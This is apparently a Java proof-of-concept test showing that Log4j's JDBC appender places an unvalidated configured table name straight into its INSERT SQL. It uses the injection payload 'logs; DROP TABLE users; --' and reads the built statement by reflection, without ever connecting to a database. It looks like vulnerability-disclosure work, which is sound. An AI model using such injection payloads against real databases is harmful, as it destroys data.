import java.lang.reflect.Field;
import java.sql.Connection;
import java.sql.SQLException;
import org.apache.logging.log4j.core.appender.db.jdbc.ColumnConfig;
import org.apache.logging.log4j.core.appender.db.jdbc.ConnectionSource;
import org.apache.logging.log4j.core.appender.db.jdbc.JdbcDatabaseManager;

/**
 * Drives the exact real code that builds Log4j's INSERT statement
 * (JdbcDatabaseManagerFactory.createManager(), package-private, reached only
 * through the public JdbcDatabaseManager.getManager() -- the same entry
 * point a configured JdbcAppender uses) with an attacker/config-controlled
 * table name, and reads the resulting SQL field via reflection -- the exact
 * field the real prepareStatement() call at JdbcDatabaseManager.java:728
 * consumes.
 */
class SqlRealSourceProof {

    private static int failed = 0;
    private static final String DROP_PAYLOAD = "logs; DROP TABLE users; --";

    /** Never actually connects -- getManager() only needs the interface satisfied. */
    static final class NullConnectionSource implements ConnectionSource {
        @Override
        public Connection getConnection() throws SQLException {
            throw new SQLException("not needed for this proof -- SQL is built before connecting");
        }

        @Override
        public org.apache.logging.log4j.core.LifeCycle.State getState() {
            return org.apache.logging.log4j.core.LifeCycle.State.STARTED;
        }

        @Override
        public void initialize() {}

        @Override
        public void start() {}

        @Override
        public void stop() {}

        @Override
        public boolean isStarted() {
            return true;
        }

        @Override
        public boolean isStopped() {
            return false;
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("=== SQL injection: proof through the REAL Log4j source ===\n");

        vulnerableConfiguredTableNameEntersRealSql();

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
    }

    /**
     * getManager() is exactly what a configured <JDBC tableName="..."> appender
     * calls. There is no validation of tableName anywhere in this real path --
     * confirmed by driving it, not by reading the source and assuming.
     */
    private static void vulnerableConfiguredTableNameEntersRealSql() throws Exception {
        ColumnConfig column = ColumnConfig.newBuilder()
                .setName("message")
                .setPattern("%m")
                .build();

        JdbcDatabaseManager manager = JdbcDatabaseManager.getManager(
                "sql-real-source-proof",
                0,
                null,
                new NullConnectionSource(),
                DROP_PAYLOAD, // the "configured" table name -- attacker/env-influenced
                new ColumnConfig[] {column},
                null);

        Field field = JdbcDatabaseManager.class.getDeclaredField("sqlStatement");
        field.setAccessible(true);
        String realSql = (String) field.get(manager);

        assertTrue("the payload appears verbatim inside the SQL the real JdbcDatabaseManager "
                + "built and will pass to prepareStatement() -- captured SQL: \"" + realSql + "\"",
                realSql.contains(DROP_PAYLOAD));
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
